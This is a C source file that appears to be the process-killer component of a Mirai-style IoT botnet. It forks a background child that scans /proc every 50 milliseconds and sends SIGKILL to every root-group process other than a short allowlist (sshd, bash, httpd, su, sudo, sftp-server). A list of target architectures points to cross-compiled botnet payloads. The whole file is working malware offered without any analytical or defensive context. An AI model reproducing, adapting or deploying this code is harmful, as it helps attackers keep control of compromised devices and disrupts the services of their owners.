#define _GNU_SOURCE
#ifdef DEBUG
	#include <stdio.h>
#endif
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#include "killer.h"

const char *nokillnames[] = {
	"sshd",
	"bash",
	"httpd",
    "su",
    "sudo",
	"sftp-server"
};

char *mps[] = {
	"x86",
	"mips",
	"arm",
	"arm4",
	"arm5",
	"arm6",
	"arm7"
};


int len = sizeof(nokillnames) / sizeof(nokillnames[0]);

void killerinit(void) 
{
	int childpid;

	childpid = fork();

	if(childpid == -1 || childpid > 0)
		return;

	call_kill();
}

void call_kill()
{
	int fds;
	struct dirent **file;

	while(1)
	{
		fds = scandir("/proc/", &file, 0, 0);

		while(fds--)
		{
			killer_group(file[fds]);
		}
	
		free(file);
		usleep(50000); 
	}
}



void killer_group(struct dirent *file) 
{
	int fd, pid;
	char rdstatus[4096], rdcmdline[100], rdpath[25];

	pid = atoi(file->d_name);

	if(pid == getppid() || pid == getpid() || pid == 0)
		goto end;

	strcpy(rdpath, "/proc/");
	strcat(rdpath, file->d_name);
	strcat(rdpath, "/status");

	fd = open(rdpath, O_RDONLY);
	read(fd, rdstatus, sizeof(rdstatus) - 1);
	close(fd);

	strcpy(rdpath, "/proc/");
	strcat(rdpath, file->d_name);
	strcat(rdpath, "/cmdline");

	fd = open(rdpath, O_RDONLY);
	read(fd, rdcmdline, sizeof(rdcmdline) - 1);
	close(fd);

	for(int i = 0; i < len; i++)
		if(strstr(rdcmdline, nokillnames[i]))
			goto end;


	if(strstr(rdstatus, "Groups:\t0")) 
	{
#ifdef DEBUG
		printf("[DBG / KILLER] Killing Pid ( %d ) cmdline: ( %s )\n", pid, rdcmdline);
#endif
		kill(pid, 9); 
	}
	end:;
	memset(rdstatus, 0, sizeof(rdstatus));
}	

